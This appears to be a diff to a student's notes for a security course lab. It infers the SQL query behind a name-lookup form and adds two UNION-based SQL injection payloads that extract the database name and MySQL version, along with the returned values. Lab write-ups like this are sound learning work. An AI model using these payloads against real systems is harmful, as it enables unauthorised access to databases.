@@ -6,5 +6,12 @@ First name:
 Last name:
 
 This implies that the SQL query is something like:
-SELECT first_name, last_name FROM users WHERE something = '$input';
+SELECT id, first_name, last_name FROM users WHERE something = '$input';
+
+' UNION SELECT null, database(), null -- 
+' UNION SELECT null, version(), null -- 
+
+
+Name: cs4440_project3_xtra_cr3dit
+Version: 8.0.41-0ubuntu0.22.04.1
 
